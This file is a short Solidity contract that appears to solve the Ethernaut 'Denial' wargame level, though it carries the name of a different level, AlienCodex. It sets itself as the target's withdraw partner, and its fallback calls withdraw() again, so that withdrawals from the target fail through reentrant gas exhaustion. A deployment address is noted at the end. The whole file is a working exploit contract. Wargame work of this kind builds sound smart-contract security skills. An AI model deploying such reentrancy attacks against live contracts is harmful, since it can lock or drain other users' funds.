//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial{
  function withdraw() external;
  function setWithdrawPartner(address _partner) external;
}


contract AlienCodex  {

    Denial denial;

    constructor(address _addr) {
        denial = Denial(_addr);
        denial.setWithdrawPartner(address(this));
    }

    // receive() payable external{
    //     denial.withdraw();
    // }

    fallback() payable external{
        denial.withdraw();
    }

}

//0x97fb64Bc87c3E8Fb3FCDb0669532a023d2522CbB